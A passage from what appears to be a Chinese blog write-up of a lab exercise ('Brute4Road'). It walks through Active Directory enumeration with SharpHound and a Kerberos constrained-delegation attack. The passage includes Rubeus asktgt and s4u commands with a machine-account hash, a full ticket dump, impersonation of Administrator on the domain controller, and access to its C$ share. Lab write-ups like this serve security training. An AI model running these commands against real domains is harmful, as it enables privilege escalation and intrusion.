+</span></span><span class=line><span class=cl>net user /domain
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror-brute4road/PixPin_2025-06-18_13-32-31.gif width=2051 height=1237 loading=lazy alt=1></p><p>收集域内信息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>cd</span> C:\Users\test1\Desktop
+</span></span><span class=line><span class=cl>SharpHound.exe -c all
+</span></span></code></pre></td></tr></table></div></div><p>直接找到这个机器用户看到入站执行权限里面DC是他的受约束委派用户</p><p><img src=/p/springautumn-cloudmirror-brute4road/7.png width=1569 height=739 loading=lazy alt=1></p><blockquote><p>In the following example, <em>victim</em> is the attacker-controlled account (i.e. the hash is known) that is configured for constrained delegation. That is, <em>victim</em> has the &ldquo;HTTP/PRIMARY.testlab.local&rdquo; service principal name (SPN) set in its msds-AllowedToDelegateTo property. The command first requests a TGT for the <em>victim</em> user and executes the S4U2self/S4U2proxy process to impersonate the &ldquo;admin&rdquo; user to the &ldquo;HTTP/PRIMARY.testlab.local&rdquo; SPN. The alternative sname &ldquo;cifs&rdquo; is substituted in to the final service ticket and the ticket is submitted to the current logon session. This grants the attacker the ability to access the file system of PRIMARY.testlab.local as the &ldquo;admin&rdquo; user.
+在以下示例中，<em>victim</em> 是为受约束委派配置的攻击者控制的帐户（即哈希值是已知的）。也就是说，<em>victim</em> 在其 msds-AllowedToDelegateTo 属性中设置了“HTTP/PRIMARY.testlab.local”服务主体名称 （SPN）。该命令首先为 <em>受害者</em> 用户请求 TGT，并执行 S4U2self/S4U2proxy 进程，将“admin”用户模拟到“HTTP/PRIMARY.testlab.local”SPN。替代名称“cifs”将替换到最终服务票证中，并将票证提交到当前登录会话。这使攻击者能够以“admin”用户身份访问 PRIMARY.testlab.local 的文件系统。</p></blockquote><p>可以进行约束委派攻击<strong>FULL S4U2</strong>，有了机器用户的<code>NTHash</code>就可以申请TGT</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Users\test1\Desktop</span><span class=c1>&gt;.\Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:4f4be8211219a166ed7d4db9f3ea90f1 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ______        _
+</span></span><span class=line><span class=cl>  <span class=p>(</span>_____ \      <span class=p>|</span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>   _____<span class=p>)</span> )_   _<span class=p>|</span> <span class=p>|</span>__  _____ _   _  ___
+</span></span><span class=line><span class=cl>  <span class=p>|</span>  __  /<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>  _ \<span class=p>|</span> ___ <span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=p>|</span>/___)
+</span></span><span class=line><span class=cl>  <span class=p>|</span> <span class=p>|</span>  \ \<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span> <span class=p>|</span>_) ) ____<span class=p>|</span> <span class=p>|</span>_<span class=p>|</span> <span class=p>|</span>___ <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>_<span class=p>|</span>   <span class=p>|</span>_<span class=p>|</span>____/<span class=p>|</span>____/<span class=p>|</span>_____)____/(___/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  v2.2.0
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[*] Action: Ask TGT
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>[*] Using rc4_hmac hash: ba19fde2ad1b06b123522cbadd28521c
+</span></span><span class=line><span class=cl>[*] Building AS-REQ (w/ preauth) for: &#39;xiaorang.lab\MSSQLSERVER$&#39;
+</span></span><span class=line><span class=cl>[*] Using domain controller: 172.22.2.3:88
+</span></span><span class=line><span class=cl>[+] TGT request successful!
+</span></span><span class=line><span class=cl>[*] base64(ticket.kirbi):
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>      doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE1TOiCBmHM2Ha6tp0uHeMQtXvcRO783PdU+aN6yn3uHivf0x9uoQTFr2PWHry5GmIc4FrtcR6dis3h4NgCFc2cZIK9AVW6rLRsgnQKHaAvDJNQyL89Yi+B7SrvWPwm+Fic0FyYmffV6WSsKubCu17Iwt17wvL88lqWqUBykz3h8xRXvzIK4vXpR4Yl7NLCBZXEA9lztqDuD0gbHjeQXm3U9pLxL+fLhUp87RQCWuhRXGHn+WfxeAlZMdIhrJdl5mf7QiUjlx5s+ydKMRh/CvUXR/9XOgt0TQNvnQLm68Wn/TOlQWVwA2PXO+W/bz6OqsQs/auGfmAwjfT67k/BJBOeoyReYlqo2WdDAYl3DJQocHNfteFCgU7/c9517zzbDDmzkPN6WEDOWJhRXLhhdvLiwLJguzESbTxe7c6DsMky2NLSL+w/z1229scI+eoRhWQFnm5kDPeoHcrEu2j4RsLcdLAAoo56ALr1+dINBeejDDER92J9YI4YByIV8XKGqe12Be/yj0UXVb7/0z4d0slY5tfCiIFbbhRIWrsiNitAEGdYypNOVGIJVgmNHRs5kjDnncaJq/B8cWIEHvvYvcG1BDlthCvSQ7uiDlv1uDvNjR+7Z7WvD1XhsoDNOlrwI6h/h/M1oNYx/5yGoQlNoj3dIq9/6jWtaghZW7hlCIbPX27AgLxbPUUrBGGXDlD/J/2iw2veboSYMPtuThiWY2juCKAIw397SbokXmV79HNFnKx4Dqq4wGvY9jLcYz/Zm594zks3mZuD2k3dB92ZEb2TYCNzKxMe+QFcyUkxg4BLLlhWlYlm4m/XxbyKoRfRE0VxW5yKffn9r7kKLkfHRBfnJ5qLDNz6LOjugUuPd8Dum6udKxCIuEUD7pENa6Qe9+1NUwGvuN0f5KWszsoIOZCv6hc//f+pQ1cFuExhv2XGR2+cYTRORZHkbUF+Wxgt9UWE2l3OhnzOT5S5xRp4n5OxjsTxzyLnJDvgPZR4BX9IbiNmF+Lbwt46SzDxhqqdgWRdchjUJYqbpEqE2rW/UqaeaumRgoVQX+v6qVQP6WKcZUIX3Idz2Y1T+xq/gqpnDysuIA18GlN3Yk4DVdBmi+YmfIQBCl2Dop8QYXdIpRpH4njvzsXqw+AyAG5uMIvFgsRh92hxkTPLW1HLJweZwKSrvnsc/hHql73Euix+QLwckgS2aKjmXkJNyT8bjvPO9N30dQ+CILbEwzS14umUWnv3si3kRk77c3pIzKdmVx18IrW6r7DZrSAbb/mfo8wIls4/pV/d6z7rCqREfO6/zS66PwVTM15DfUMRjQl26Y6mO66tnV7gOF9UYrhpd3/4xkEKXfyCX/KHMTienLKxdX67UACJjkMiWZD6LCCQxLto5nK8sXBB0srtLhYvxaFDSA0vtENnGKiLcMn87TPLbxtrTjeYsZhPjO6eOrJ/6zvcqmW8gw48ZIdatujgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBDxBbDHOspNBhHbGjmwKfZUoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDUxOTA3NDIwOFqmERgPMjAyNTA1MTkxNzQyMDhapxEYDzIwMjUwNTI2MDc0MjA4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>  ServiceName              :  krbtgt/xiaorang.lab
+</span></span><span class=line><span class=cl>  ServiceRealm             :  XIAORANG.LAB
+</span></span><span class=line><span class=cl>  UserName                 :  MSSQLSERVER$
+</span></span><span class=line><span class=cl>  UserRealm                :  XIAORANG.LAB
+</span></span><span class=line><span class=cl>  StartTime                :  2025/5/19 15:42:08
+</span></span><span class=line><span class=cl>  EndTime                  :  2025/5/20 1:42:08
+</span></span><span class=line><span class=cl>  RenewTill                :  2025/5/26 15:42:08
+</span></span><span class=line><span class=cl>  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+</span></span><span class=line><span class=cl>  KeyType                  :  rc4_hmac
+</span></span><span class=line><span class=cl>  Base64(key)              :  8QWwxzrKTQYR2xo5sCn2VA==
+</span></span><span class=line><span class=cl>  ASREP (key)              :  BA19FDE2AD1B06B123522CBADD28521C
+</span></span></code></pre></td></tr></table></div></div><p>再注入票据进行S4U攻击</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWooIEqzCCBKdhggSjMIIEn6ADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMeGlhb3JhbmcubGFio4IEYzCCBF+gAwIBEqEDAgECooIEUQSCBE0DbJuuq5Ria/zpevMDmrKCFPThuc66RXD9pTO38JXwSqw0zr2rE00SEJ3DcFS07mLk6NF80OnbIWri1GlYMeB4LRvz62xIAYJsfHTeGY/EuTMB94HdXiE6HnqftUHkK3Rknp8LgypfFDkpVm/TgjBrPnPL5Hnp33ovntmbn30g3J8x8ne5LHBVJnCQzwM5zG+Mq4TcU/THF8VYxpapAMCPUg1TwnzgFqOk7v8fTOPdqVHr1J9RmOxenVocAM04HDvGMlH3/1Z3d1eZt3JYkeuU+b0XzIWS1D2HK7x/uRPFBCtiUVuPb0YOCLTLEwW5PCF1gBUyfwLhshxB0NLacT1R+OQAp+gu8nSef/CrovPqxYMkFVmy6Db3/IH+gJhanCAQZMoGePBrJGAkVdZIz8dGZ6dXzqKMxy4t5sSv8AofwTqRoHwnw1GuRlJsEcUuemwTPVZNeHL4wBAa7G4lKKvClZKGcV4mnqou3Ow/DFu4tNTaZLcQfxOPQUN0TyTlXd/dkWEKvoFPjjRxCjuKL8WQ6+4aHtzTcJvd4a4BOXy3cAmgewYt2GVOwgqpyL0DK5wmsI/4uJoGk4iUrFICdJpxhQ0y/MhQAPhtLlRINLPoCCJLNRQ5cHq5qLHxqAqKeYrJxwpoLQaPKzUW5sMYyAeK8WK4kExyPBJaglQOQiVhzazK2LGs2Y25sE3nEMDhLoKOgHy1YPL0wn5BfUUHi0k4k25YdJt8HU48AW9rqzaovASOVuTasloYYRlxFxKlifYyEVaJGXykavY35sR2kQthghLgAZRaCUHuESM0beksOd5uRTL8lfi27tJ4GOJkNicns4gFP4gGBFX62DXOmk+3WjBcueFtqYmlLOjEqP+km3/NmnoJRPhvj0k3Qd7CGMhiRFbd4J9I2BcWNA3IYeFePr8NNPPvGMlbLzMtkpdR0wEuM8jCYR4jjDXqlVX71Z5fzCnMFrg/7pqnqQ+DZy7avDGgJ2rlOZffHEeOBNGHJBOHv1qihrxcXNis39R6gvtBbpWlDwG7WhvWaVR7i34neY9mGr+B202l3NucYGnJqBNONaugHY0wad+D/0cBZ+HG+sOBlIq5d/WvZAk6i2nG6MuVl7VcTURxtq9tOf48eC0XF2YMUTRJrjbEI1hD0yzkrGNIYp553jLgNwslYvf7/ndKbe1mPr4scYHgQLu9y/e8hs9rl3jru6kizB+CGTqhkMGSUrFzml7S3QEoufIx9DpjtmpksZqEQxsYXijbp/9Cn6NtGdxmm4O1VcHUr12VotESpaBQCGqaFFck0dnjt9LzkQOhQr3mbgoFHdSZevbItF/CAtx2eXW0wmciLOgVabZslEPWoFWeI9ZUqsMsvEEjXqXPJHiKc4KOokw9OeZIdVbPr91GOzIrAXMVv98XP42rGDohw60RcMA6OsaJeCh7IH3S6w0zGuu91ikcmIUsHMOWcP6IlkfXJVWjgdowgdegAwIBAKKBzwSBzH2ByTCBxqCBwzCBwDCBvaAbMBmgAwIBF6ESBBBznQz6kRyRh31/JiQ6BknfoQ4bDFhJQU9SQU5HLkxBQqIZMBegAwIBAaEQMA4bDE1TU1FMU0VSVkVSJKMHAwUAQOEAAKURGA8yMDI1MDYxODA1MzU1OFqmERgPMjAyNTA2MTgxNTM1NThapxEYDzIwMjUwNjI1MDUzNTU4WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDHhpYW9yYW5nLmxhYg==
+</span></span></code></pre></td></tr></table></div></div><p>看起来太长了也可以直接一次性搞定，让他在内部申请TGT再直接完成S4U攻击</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>.\Rubeus.exe s4u /user:MSSQLSERVER$ /rc4:4f4be8211219a166ed7d4db9f3ea90f1 /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>type</span> \\DC.xiaorang.lab\C$\Users\Administrator\flag\flag04.txt
+</span></span></code></pre></td></tr></table></div></div></section><footer class=article-footer><section class=article-tags><a href=/tags/pentest/>Pentest</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
